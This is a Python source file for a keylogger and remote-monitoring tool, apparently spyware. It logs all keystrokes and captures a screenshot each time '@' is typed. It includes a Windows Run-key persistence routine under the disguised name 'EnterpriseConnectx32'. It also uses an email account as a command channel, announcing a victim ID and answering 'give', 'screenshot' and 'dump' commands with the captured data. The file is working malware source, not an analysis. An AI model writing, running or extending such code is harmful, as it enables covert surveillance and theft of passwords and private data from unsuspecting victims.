# screenshots
import pyautogui

# keylogger
from pynput import keyboard

# email
from emailpart import EmailManager

# system
import os
import sys
import winreg as reg

# wifi
import socket
import random

import datetime

# demo = screenshot var
# shot = screenshot var
# det = screenshot
# sc = screenshot
# ss = screenshotfolder
# logs = screenshotfolder

def is_connected():
    try:
        # Attempt to create a socket and connect to Google's public DNS server
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        pass
    return False

def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "EnterpriseConnectx32"

    try:
        key = reg.HKEY_CURRENT_USER
        with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as registry_key:
            reg.SetValueEx(registry_key, value_name, 0, reg.REG_SZ, script_path)
    except Exception as e:
        print("Error adding to startup:", e)

# making necessary directories
try:
    os.mkdir(os.path.dirname(os.path.abspath(sys.argv[0])) + "\\logs")
except FileExistsError:
    print("Folder already exists.")

try:
    os.mkdir(os.path.dirname(os.path.abspath(sys.argv[0])) + "\\ss")
except FileExistsError:
    print("Folder already exists.")

# ID assignment
txt_file = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\ID"

if not os.path.exists(os.path.dirname(os.path.abspath(sys.argv[0])) + "\\ID"):
    ID = str(random.randint(1, 10000))

    # Open the file in write mode ('w')
    with open(txt_file, 'w') as file:
        file.write(str(ID))
else:
    with open(txt_file, 'r') as file:
        content = file.read()
    ID = content
print(ID)

# Keylog section
inputs = []

z = 1
def on_press(key):
    global z

    try:
        inputs.append(key.char)
        if key.char == '@':
            demo = pyautogui.screenshot()
            print("saved")
            demo.save(f"logs/det{z}.jpg")
            z += 1
    except AttributeError:
        inputs.append(key)

def on_release(key):
    ...
    if key == keyboard.Key.esc:
        # Stop listener
        return False

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

email = "email"
password = "password"

# add_to_startup()
#usage: Command ID, eg: screenshot 7512

if __name__ == "__main__":
    manager = EmailManager(email, password)

    setup = 0
    while setup == 0:
        if is_connected():
            manager.new_email(manager.email, "ID", "screenshot", "[+] ID: " + str(ID) + "\n[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
            setup = 1
        else:
            print("not connected")
            pass
    while True:
        if is_connected():
            manager.quick_check(manager.email, "give", inputs, ID)
            manager.quick_check(manager.email, "screenshot", inputs, ID)
            manager.quick_check(manager.email, "dump", inputs, ID)
        else:
            print("no internet")
            pass
